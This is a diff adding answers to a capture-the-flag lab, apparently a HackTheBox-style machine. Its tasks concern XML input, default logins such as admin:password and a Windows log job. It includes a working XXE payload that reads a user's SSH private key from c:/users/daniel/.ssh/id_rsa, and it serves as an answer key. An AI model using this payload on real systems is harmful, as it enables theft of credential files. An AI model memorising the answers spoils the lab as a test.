@@ -59,3 +59,53 @@ administrator:password
 
 admin:password
 
+TASK 3
+
+What is the word at the top of the page that accepts user input?
+
+order
+
+TASK 4
+
+What XML version is used on the target?
+
+1.0
+
+What does the XXE / XEE attack acronym stand for?
+
+XML External Entity
+
+TASK 6
+
+What username can we find on the webpage's HTML code?
+
+daniel
+
+TASK 7
+
+What is the file located in the Log-Management folder on the target?
+
+job.bat
+
+XEE 
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
+<order>
+<quantity>
+3
+</quantity>
+<item>
+&test;
+</item>
+<address>
+17th Estate, CA
+</address>
+</order>
+
+TASK 8
+
+What executable is mentioned in the file mentioned before?
+
+wevtutil.exe
+
